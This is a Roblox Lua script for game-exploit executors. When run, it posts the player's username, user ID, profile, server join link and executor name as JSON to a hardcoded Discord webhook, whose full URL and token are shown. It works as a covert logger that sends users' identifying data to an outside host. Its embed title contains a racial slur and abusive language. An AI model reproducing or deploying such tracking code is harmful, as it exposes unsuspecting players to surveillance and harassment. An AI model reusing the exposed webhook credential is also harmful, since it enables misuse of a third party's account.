local url =
    "https://discord.com/api/webhooks/983455893339406427/2dMkwgwKIkd6ys8E3WYXtXaWvpbB-LqLzGuKh_D79OFUCY8PDLdGSr24-B3doOfiw1S7"

local webhookcheck =
    is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
    secure_load and "Sentinel" or
    KRNL_LOADED and "Krnl" or
    SONA_LOADED and "Sona" or
    "Kid with shit exploit"

local data = {
    ["content"] = "Porfile: "..profile,
    ["embeds"] = {
        {
            ["title"] = "**LanxilityV2 go cry nigga @everyone shut the fuck up**",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.."("..game.Players.LocalPlayer.UserId..") with **"..webhookcheck.."**".." Here is there job id to join them: "..joinurl,
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
            ["image"] = {
                ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
                    tostring(game:GetService("Players").LocalPlayer.Name)
            }
        }
    }
}
local newdata = game:GetService("HttpService"):JSONEncode(data)

local headers = {
    ["content-type"] = "application/json"
}
request = http_request or request or HttpPost or syn.request
local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
request(abcdef)
